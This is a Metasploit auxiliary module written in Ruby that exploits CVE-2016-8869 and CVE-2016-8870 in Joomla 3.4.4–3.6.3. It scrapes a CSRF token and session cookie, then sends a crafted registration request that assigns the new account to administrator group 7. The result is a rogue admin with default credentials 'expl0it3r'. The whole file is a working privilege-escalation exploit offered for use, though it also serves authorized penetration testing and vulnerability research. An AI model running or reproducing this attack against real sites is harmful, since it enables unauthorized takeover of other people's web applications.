##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Account Creation and Privilege Escalation',
      'Description'    => %q{
        This module allows to create an arbitrary account with administrative privileges in Joomla versions 3.4.4
        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
      },
      'References'     =>
        [
          ['CVE', '2016-8869'],
          ['CVE', '2016-8870'],
          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
        ],
      'Author'         =>
        [
          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Joomla 3.4.4 - 3.6.3', {}]],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 25 2016'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),
        OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
        OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
      ], self.class)
      deregister_options('VHOST')
  end

  def run
    print_status("Trying to create the user!")
    response = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
      'vars_get' => {
        'view' => 'login'
      }
    )

    cookie = response.get_cookies
    csrf = response.body.match(/name="(\w{32})"/i).captures[0]

    boundary = "157247343414135650641514240823"

    ctype = "multipart/form-data; boundary=---------------------------#{boundary}"

    post_data = ""
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[name]\"" + "\r\n\r\n"
    post_data << datastore['USERNAME'] + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[username]\"" + "\r\n\r\n"
    post_data << datastore['USERNAME'] + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[groups][]\"" + "\r\n\r\n"
    post_data << "7" + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[password1]\"" + "\r\n\r\n"
    post_data << datastore['PASSWORD'] + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[password2]\"" + "\r\n\r\n"
    post_data << datastore['PASSWORD'] + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[email1]\"" + "\r\n\r\n"
    post_data << datastore['EMAIL'] + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"user[email2]\"" + "\r\n\r\n"
    post_data << datastore['EMAIL']  + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"option\"" + "\r\n\r\n"
    post_data << "com_users" + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"task\"" + "\r\n\r\n"
    post_data << "user.register" + "\r\n"
    post_data << "-----------------------------#{boundary}" + "\r\n"
    post_data << "Content-Disposition: form-data; name=\"#{csrf}\"" + "\r\n\r\n"
    post_data << "1" + "\r\n"
    post_data << "-----------------------------#{boundary}--" + "\r\n"

    res = send_request_raw(
      {
        'uri' => normalize_uri(target_uri.path, 'index.php/component/users/?task=user.register'),
        'method' => 'POST',
        'data' => post_data,
        'headers' =>
        {
          'Content-Length' => post_data.length,
          'Content-Type'  => ctype,
          'Cookie'  => cookie
        }
      }
    )

    if res && res.code == 200
      print_good("PWND - Your user has been created")
      print_status("\tUsername: " + datastore['USERNAME'])
      print_status("\tPassword: " + datastore['PASSWORD'])
    else
      if res && res.code == 303
        while res.code == 303 do
          redirect =  URI(res.headers['Location']).to_s.gsub(/#\//, "")

          res = send_request_cgi({
            'uri' => redirect,
            'method' => 'GET',
            'headers' =>
            {
              'Cookie'  => cookie
            }
          })
        end

        errMessage = res.body.match(/class="alert-message">(.*)<\/div>/i).captures[0]
        print_error("There was an issue, but the user could have been created.")
        print_error("\t" + errMessage)
      end
    end
  end
end
